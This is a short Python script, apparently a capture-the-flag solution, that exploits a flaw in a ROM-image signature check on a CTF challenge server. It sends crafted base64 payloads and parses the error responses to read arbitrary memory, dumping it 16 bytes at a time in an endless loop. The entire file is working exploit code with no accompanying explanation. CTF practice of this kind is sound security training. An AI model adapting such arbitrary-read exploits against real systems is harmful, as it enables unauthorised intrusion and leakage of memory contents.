import socket, base64, sys

def arb_read(addr):
    payload = b'POSO\1\0\x80\0'+((addr-0x80002400)&0xffffffff).to_bytes(4, 'little')
    payload = base64.b64encode(payload).strip()
    sock = socket.create_connection(('opossum.level-up.2020.tasks.cyberchallenge.ru', 20003))
    sock.sendall(payload+b'\n')
    ans = b''
    while True:
        c = sock.recv(1)
        ans += c
        if not c: break
    assert ans.startswith(b'Insert ROM image (base64 encoded): [ERROR] Bad signature: \x00\n'), ans
    if len(ans) == 98: return ans[60:76]
    ans = bytes(int(i, 16) for i in ans[60:].split(b'\n', 1)[0].decode('ascii').split())
    assert len(ans) == 16
    return ans

if __name__ == '__main__':
    addr = 0x80000400
    while True:
        sys.stdout.buffer.write(arb_read(addr))
        sys.stdout.buffer.flush()
        addr += 16
